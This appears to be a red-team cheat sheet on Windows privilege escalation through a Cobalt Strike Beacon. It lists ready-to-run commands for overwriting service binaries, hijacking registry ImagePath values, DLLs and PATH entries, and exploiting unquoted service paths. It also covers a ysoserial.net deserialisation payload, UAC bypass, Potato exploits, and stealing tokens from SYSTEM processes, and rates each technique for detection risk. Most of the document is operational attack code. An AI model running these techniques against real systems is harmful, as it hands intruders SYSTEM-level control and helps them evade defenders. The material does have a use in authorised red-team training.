# Privilege Escalation  

>Once initial persistence obtained and post exploitation performed, the ***Privilege Escalation*** phase is initiated.  

* Path Interception
* Weak Service Permissions
* DLL Search Order Hijacking
* Software Vulnerabilities
* User Account Control UAC  

---

## Account Context — Know Where You Stand

| Account | Integrity Level | Notes |
|---------|----------------|-------|
| Standard User | Medium | No access outside own files |
| Local Admin (no UAC elevation) | Medium | Group membership ≠ high integrity |
| Local Admin (elevated) | High | UAC-consented process |
| LocalService / NetworkService | Low–Medium | SCM-managed; network auth differs |
| SYSTEM / LocalSystem | System | Highest — exceeds local admin in some cases |

```cs
// Check current integrity level and token
beacon> getuid
beacon> whoami /groups     // via shell — look for "High Mandatory Level"
```

**Key point:** Admin group membership is meaningless until you have a high-integrity token. UAC is the gatekeeper.

---

## Vulnerable Services — Attack Surface Overview

| Misconfiguration | Technique | MITRE |
|-----------------|-----------|-------|
| Writable service binary | Service File Permissions | T1574.010 |
| Writable service registry key | Service Registry Permissions | T1574.011 |
| Missing DLL, writable exec dir | DLL Search Order Hijacking | T1574.001 |
| Writable dir in SYSTEM PATH | PATH Environment Variable | T1574.007 |
| Relative binary reference, writable dir | Search Order Hijacking | T1574.008 |
| Unquoted binary path with spaces | Unquoted Service Path | T1574.009 |
| Vulnerable elevated software | Software Exploitation | T1068 |

---

## Enumeration — Finding Privesc Vectors

### OPSEC: CAUTION (fork & run)
```cs
// Automated — SharpUp finds common service misconfigs
beacon> execute-assembly C:\Tools\SharpUp\SharpUp.exe audit

// PowerView / PowerSploit — manual checks
beacon> powerpick Get-WmiObject -Class Win32_Service | select Name,PathName,StartMode,StartName

// Native — check service config
beacon> shell sc qc <ServiceName>
beacon> shell wmic service get name,pathname,startmode,startname

// Check permissions on a path or binary
beacon> shell cacls "C:\Path\To\Service.exe"
beacon> shell icacls "C:\Path\To\Service.exe"

// Check PATH environment variable
beacon> shell env
```

---

## Weak Service File Permissions

**Condition:** Service binary ACL allows standard user write access.  
**Exploit:** Overwrite binary with payload → restart service → payload runs as SYSTEM.

```cs
// 1. Verify writable ACL on binary
beacon> shell cacls "C:\Program Files\VulnService\service.exe"
// Look for: BUILTIN\Users:(W) or Authenticated Users:(W)

// 2. Upload svc payload (must use svc.exe artifact for services)
beacon> upload C:\Payloads\beacon-svc.exe
beacon> shell copy beacon-svc.exe "C:\Program Files\VulnService\service.exe"

// 3. Restart service
beacon> shell sc stop VulnService
beacon> shell sc start VulnService
```

**Note:** Cannot overwrite binary while service is running. Stop first.  
**Destructive:** Original binary is overwritten — document and restore if needed.

---

## Weak Service Registry Permissions

**Condition:** Service registry key ACL allows standard user write access.  
**Exploit:** Modify `ImagePath` to point to payload → restart service.

```cs
// Check registry key permissions
beacon> shell reg query HKLM\SYSTEM\CurrentControlSet\Services\VulnService

// Modify ImagePath to your payload
beacon> shell reg add HKLM\SYSTEM\CurrentControlSet\Services\VulnService /v ImagePath /t REG_EXPAND_SZ /d "C:\Windows\Temp\beacon-svc.exe" /f

// Restart service
beacon> shell sc stop VulnService
beacon> shell sc start VulnService
```

### Performance Key Abuse (Clément Labro technique)
**Condition:** Writable service registry key — no need to modify ImagePath.  
**Exploit:** Add `Performance` subkey pointing to a malicious DLL. Does not disrupt normal service operation.

---

## DLL Search Order Hijacking

**DLL search order (standard applications):**
1. Executing directory (binary's own dir)
2. System32
3. 16-bit System directory
4. Windows directory
5. Current working directory
6. PATH environment variable directories

**Condition:** Service binary loads a DLL by name only (relative), and a directory higher in the search order is writable.

```cs
// 1. Check permissions on service executing directory
beacon> shell cacls "C:\Program Files\VulnService\"
// Look for: Authenticated Users or Users with (W)/(F)

// 2. Upload malicious DLL named to match the missing/hijackable DLL
beacon> upload C:\Payloads\BadDll.dll
beacon> shell copy BadDll.dll "C:\Program Files\VulnService\BadDll.dll"

// 3. Restart service to trigger DLL load
beacon> shell sc stop VulnService
beacon> shell sc start VulnService
```

**Note:** Use a reflective DLL payload — must export the functions the service expects (or use a null-export DLL if service doesn't verify).

---

## Path Interception — PATH Environment Variable

**Condition:** A directory writable by standard users is prepended to the system PATH (often by software installers placing entries before System32).

```cs
// 1. Enumerate PATH
beacon> shell env
// Look for user-writable dirs that appear BEFORE C:\Windows\System32

// 2. Check write permissions on suspicious PATH dir
beacon> shell cacls "C:\Scripts"
// Look for: Authenticated Users (W) or (F)

// 3. Drop payload named after a binary the service calls (e.g. timeout.exe)
beacon> upload C:\Payloads\beacon-svc.exe
beacon> shell copy beacon-svc.exe "C:\Scripts\timeout.exe"

// 4. Wait for service/scheduled task to call the binary, OR restart
```

**Note:** Drop as `timeout.exe` not `cmd.exe` — `cmd.exe` is protected by CreateProcess API behaviour.

---

## Path Interception — Unquoted Service Path

**Condition:** Service binary path contains spaces and is not surrounded by quotes.  
**Exploit:** CreateProcess interprets spaces as path separators and tries multiple interpretations.

```
Path: C:\Bad Program Files\Bad Service\service.exe
Interpreted as:
  1. C:\Bad.exe
  2. C:\Bad Program.exe
  3. C:\Bad Program Files\Bad.exe
  4. C:\Bad Program Files\Bad Service\service.exe  ← legitimate
```

```cs
// 1. Find unquoted service paths
beacon> shell wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v "\""
// OR use SharpUp
beacon> execute-assembly C:\Tools\SharpUp\SharpUp.exe audit

// 2. Identify writable location in the interpreted path chain
beacon> shell cacls "C:\Bad Program Files\"

// 3. Upload svc payload to the exploitable interpreted location
beacon> upload C:\Payloads\beacon-svc.exe
beacon> shell copy beacon-svc.exe "C:\Bad Program Files\Bad.exe"

// 4. Restart service
beacon> shell sc stop VulnService
beacon> shell sc start VulnService
// If can't restart — wait for reboot
```

**Must use `svc.exe` payload format for service execution.**

---

## Software Vulnerabilities (Deserialization Example)

**Condition:** Elevated application deserialises attacker-controlled data.

```bash
# Kali — generate malicious blob with ysoserial.net
# TypeConfuseDelegate gadget + BinaryFormatter + PowerShell stager
mono ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o raw \
  -c "powershell -enc <base64_payload>" > data.bin
```

```cs
// Upload blob to the location the vulnerable app reads from
beacon> upload data.bin
beacon> shell copy data.bin "C:\VulnApp\data.bin"
// Wait for app to deserialise → code executes as elevated user
```

---

## UAC Bypass

**Condition:** Current user is local admin but beacon runs at medium integrity. Need high-integrity to perform admin actions.

### elevate — spawn new high-integrity Beacon session
```cs
// List available UAC exploits
beacon> elevate

// Spawn elevated Beacon (high-integrity) via built-in bypass
beacon> elevate uac-token-duplication <listener>
beacon> elevate svc-exe <listener>
```

### runasadmin — run arbitrary command at high integrity
```cs
// List available elevators
beacon> runasadmin

// Run command elevated (no new Beacon — command only)
beacon> runasadmin uac-token-duplication <command> <args>
```

**After elevation:** Confirm with `getuid` — should show high-integrity context.

---

## Useful Privesc BOFs / Assemblies

| Tool | Use | Command |
|------|-----|---------|
| **SharpUp** | Automated service/path misconfiguration audit | `execute-assembly SharpUp.exe audit` |
| **Seatbelt** | Local host recon inc. UAC, token, user rights | `execute-assembly Seatbelt.exe -group=system` |
| **PowerView** | Service enum via WMI | `powerpick Get-WmiObject Win32_Service` |
| **Watson** | Missing patch / CVE check | `execute-assembly Watson.exe` |
| **ysoserial.net** | .NET deserialisation gadget generator | Run on Kali — upload output |

---

## SeImpersonatePrivilege Abuse

**Condition:** Beacon running as NetworkService, LocalService, or a service account with `SeImpersonatePrivilege`.  
**Exploit:** Potato-family exploits (PrintSpoofer, GodPotato, etc.) — impersonate SYSTEM token.

```cs
// Check current privileges
beacon> shell whoami /priv
// Look for: SeImpersonatePrivilege — Enabled

// PrintSpoofer via execute-assembly
beacon> execute-assembly C:\Tools\PrintSpoofer\PrintSpoofer.exe -i -c "C:\Payloads\beacon-svc.exe"

// GodPotato
beacon> execute-assembly C:\Tools\GodPotato\GodPotato.exe -cmd "C:\Payloads\beacon-svc.exe"
```

---

## getsystem — Built-in CS Primitive

```
OPSEC: CAUTION — tries multiple techniques internally, some noisy
```
```cs
beacon> getsystem
// Attempts named pipe impersonation and token duplication techniques
// Confirm result:
beacon> getuid
```

**Prefer explicit techniques (PrintSpoofer, token stealing) over getsystem for OPSEC score.**

---

## steal_token — Token Impersonation

```
OPSEC: SAFE — no new process
```
```cs
// Find a SYSTEM or high-priv process
beacon> ps
// Look for: lsass.exe, winlogon.exe, services.exe running as SYSTEM

// Steal the token
beacon> steal_token <pid>
beacon> getuid    // confirm impersonation
beacon> rev2self  // revert to original token
```

---

## Quick Reference — Privesc Decision Tree

```
Low-priv beacon?
  │
  ├─ Already local admin?
  │    └─ Medium integrity → UAC bypass
  │         elevate uac-token-duplication <listener>
  │
  ├─ SeImpersonatePrivilege?
  │    └─ PrintSpoofer / GodPotato → SYSTEM
  │
  ├─ Service misconfig? (SharpUp / wmic enum)
  │    ├─ Writable binary     → overwrite with svc payload
  │    ├─ Writable registry   → change ImagePath
  │    ├─ Unquoted path       → drop svc payload at interpreted loc
  │    ├─ Missing DLL         → DLL hijack via writable dir
  │    └─ Writable PATH dir   → drop binary named after expected call
  │
  └─ Software vuln (elevated process)?
       └─ ysoserial / exploit → code exec as elevated user

After every escalation:
  beacon> getuid    ← confirm privilege level
  beacon> rev2self  ← revert token when done with high-priv action
```

---

## OPSEC Summary

| Technique | OPSEC | Notes |
|-----------|-------|-------|
| `steal_token` | SAFE | No new process |
| `execute-assembly SharpUp` | CAUTION | Fork & run |
| `elevate uac-token-duplication` | CAUTION | Spawns new Beacon |
| `getsystem` | CAUTION | Multiple internal attempts |
| `shell sc stop/start` | UNSAFE | Spawns cmd.exe; service restart logged (Event 7036) |
| Service binary overwrite | UNSAFE | Destructive; writes to disk |
| DLL hijack drop | CAUTION | Writes to disk; triggered on service restart |
